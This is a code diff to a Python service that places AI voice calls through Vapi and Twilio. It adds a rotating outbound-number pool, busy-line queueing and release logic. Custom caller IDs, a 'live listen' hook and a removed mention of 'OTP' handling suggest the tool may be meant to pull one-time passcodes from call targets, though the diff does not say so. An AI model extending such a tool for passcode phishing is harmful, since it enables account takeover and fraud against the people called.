@@ -15,7 +15,20 @@ from twilio.rest import Client
 
 from config import ACCOUNT_SID, AUTH_TOKEN, TWILIO_PHONE_NUMBER, OUTBOUND_CALLER_ID, NGROK_URL, build_public_base_url
 from core.files import ensure_user_path, user_conf_path, write_user_file
+from services.proxy_pool import AllLinesBusyError, proxy_pool, should_use_pool
+
 logger = logging.getLogger(__name__)
+
+
+class QueuedMarker:
+    """Returned when a call could not start because every line was busy and the
+    request was parked in the auto-queue for a retry once a number frees up."""
+
+    def __repr__(self):  # noqa: D401
+        return "CALL_QUEUED"
+
+
+CALL_QUEUED = QueuedMarker()
 
 _twilio_client = None
 _call_executor = ThreadPoolExecutor(
@@ -120,62 +133,127 @@ def place_ai_call(
     record: bool = True,
     endpoint: str = "/twilio_bridge",
     mode_label: str = "AI Call",
+    queue_on_busy: bool = False,
+    queue_key: Optional[str] = None,
     **session_kwargs,
-) -> Optional[str]:
+):
     """Create a Vapi bypass session and place the call via Twilio.
 
-    Returns the Twilio SID, or None. Registers the session keyed by the Twilio
-    SID and keeps the Vapi call id in the session for OTP/transcript handling.
+    When the proxy number pool is enabled the default caller id is replaced with
+    an automatically assigned free number (custom caller ids are respected and
+    bypass the pool). The pooled number is released when the call ends (see the
+    release hooks in the webhook handlers / sweeper).
+
+    Returns the Twilio SID, or ``CALL_QUEUED`` when ``queue_on_busy`` was set and
+    the request was parked in the auto-queue, or None on real failure. Raises
+    :class:`AllLinesBusyError` when every line is busy and no queueing was used.
     """
     from services.vapi_service import create_call_bypass
 
-    bridge = create_call_bypass(
-        customer_number=to,
-        customer_name=customer_name,
-        assistant_overrides=assistant_overrides,
-        metadata=metadata,
-    )
-    if not bridge:
-        logger.error("[VAPI_BRIDGE] bypass call failed for %s (user=%s)", to, user_id)
-        return None
+    pool_number = None
+    acquired_default = False
+    if should_use_pool(from_number):
+        acquired_default = True
+        try:
+            pool_number = proxy_pool.acquire(user_id, chat_id)
+            from_number = pool_number
+            if caller_id in (None, "") or caller_id == from_number:
+                caller_id = from_number
+        except AllLinesBusyError as busy:
+            logger.warning("[NUMBER_POOL] busy %s (user=%s queue=%s)", busy, user_id, queue_key)
+            if queue_on_busy and queue_key:
+                try:
 
-    vapi_call_id = bridge["vapi_call_id"]
-    twiml = bridge["twiml"]
-    twilio_sid = dial_call_with_twiml(
-        to=to,
-        from_number=from_number or OUTBOUND_CALLER_ID,
-        twiml=twiml,
-        user_id=user_id,
-        chat_id=chat_id,
-        caller_id=caller_id,
-        record=record,
-    )
-    if not twilio_sid:
-        logger.error("[VAPI_BRIDGE] Twilio dial failed for %s (vapi_call=%s)", to, vapi_call_id)
-        return None
+                    def _retry():
+                        place_ai_call(
+                            to=to,
+                            user_id=user_id,
+                            chat_id=chat_id,
+                            customer_name=customer_name,
+                            assistant_overrides=assistant_overrides,
+                            metadata=metadata,
+                            from_number=from_number,
+                            caller_id=caller_id,
+                            record=record,
+                            endpoint=endpoint,
+                            mode_label=mode_label,
+                            queue_on_busy=True,
+                            queue_key=queue_key,
+                            **session_kwargs,
+                        )
 
-    logger.info("[VAPI_BRIDGE] Call placed by Twilio sid=%s vapi_call=%s target=%s (user=%s)",
-                twilio_sid, vapi_call_id, to, user_id)
-    store_call_metadata(user_id, twilio_sid, target=to)
+                    queued = proxy_pool.submit(_retry, key=queue_key)
+                except Exception:
+                    queued = False
+                logger.info("[NUMBER_POOL] queued call key=%s result=%s", queue_key, queued)
+                return CALL_QUEUED if queued else None
+            raise
+
     try:
-        from bot import register_call_session
-        register_call_session(
-            twilio_sid,
-            user_id,
-            chat_id=chat_id,
-            endpoint=endpoint,
-            mode_label=mode_label,
-            vapi_call_id=vapi_call_id,
-            **session_kwargs,
+        bridge = create_call_bypass(
+            customer_number=to,
+            customer_name=customer_name,
+            assistant_overrides=assistant_overrides,
+            metadata=metadata,
         )
+        if not bridge:
+            logger.error("[VAPI_BRIDGE] bypass call failed for %s (user=%s)", to, user_id)
+            if pool_number:
+                proxy_pool.release(pool_number)
+            return None
+
+        vapi_call_id = bridge["vapi_call_id"]
+        twiml = bridge["twiml"]
+        twilio_sid = dial_call_with_twiml(
+            to=to,
+            from_number=from_number or OUTBOUND_CALLER_ID,
+            twiml=twiml,
+            user_id=user_id,
+            chat_id=chat_id,
+            caller_id=caller_id,
+            record=record,
+        )
+        if not twilio_sid:
+            logger.error("[VAPI_BRIDGE] Twilio dial failed for %s (vapi_call=%s)", to, vapi_call_id)
+            if pool_number:
+                proxy_pool.release(pool_number)
+            return None
+
+        if pool_number:
+            proxy_pool.bind_sid(pool_number, twilio_sid)
+
+        logger.info("[VAPI_BRIDGE] Call placed by Twilio sid=%s vapi_call=%s target=%s (user=%s)",
+                    twilio_sid, vapi_call_id, to, user_id)
+        store_call_metadata(user_id, twilio_sid, target=to)
+        call_session_kwargs = dict(session_kwargs)
+        if acquired_default:
+            call_session_kwargs["pool_number"] = pool_number
+        try:
+            from bot import register_call_session
+            register_call_session(
+                twilio_sid,
+                user_id,
+                chat_id=chat_id,
+                endpoint=endpoint,
+                mode_label=mode_label,
+                vapi_call_id=vapi_call_id,
+                **call_session_kwargs,
+            )
+        except Exception as exc:
+            logger.debug("Failed to register bridge session: %s", exc)
+        try:
+            from bot import _notify_live_listen_start
+            _notify_live_listen_start(twilio_sid, chat_id=chat_id, user_id=user_id)
+        except Exception as exc:
+            logger.debug("Failed to bootstrap live listen session: %s", exc)
+        return twilio_sid
+    except AllLinesBusyError:
+        raise
     except Exception as exc:
-        logger.debug("Failed to register bridge session: %s", exc)
-    try:
-        from bot import _notify_live_listen_start
-        _notify_live_listen_start(twilio_sid, chat_id=chat_id, user_id=user_id)
-    except Exception as exc:
-        logger.debug("Failed to bootstrap live listen session: %s", exc)
-    return twilio_sid
+        logger.error("[VAPI_BRIDGE] unexpected error for %s (user=%s): %s", to, user_id, exc)
+        if pool_number:
+            proxy_pool.release(pool_number)
+        return None
 
 
 def make_call(to: str, from_number: str = None, caller_id: str = None,
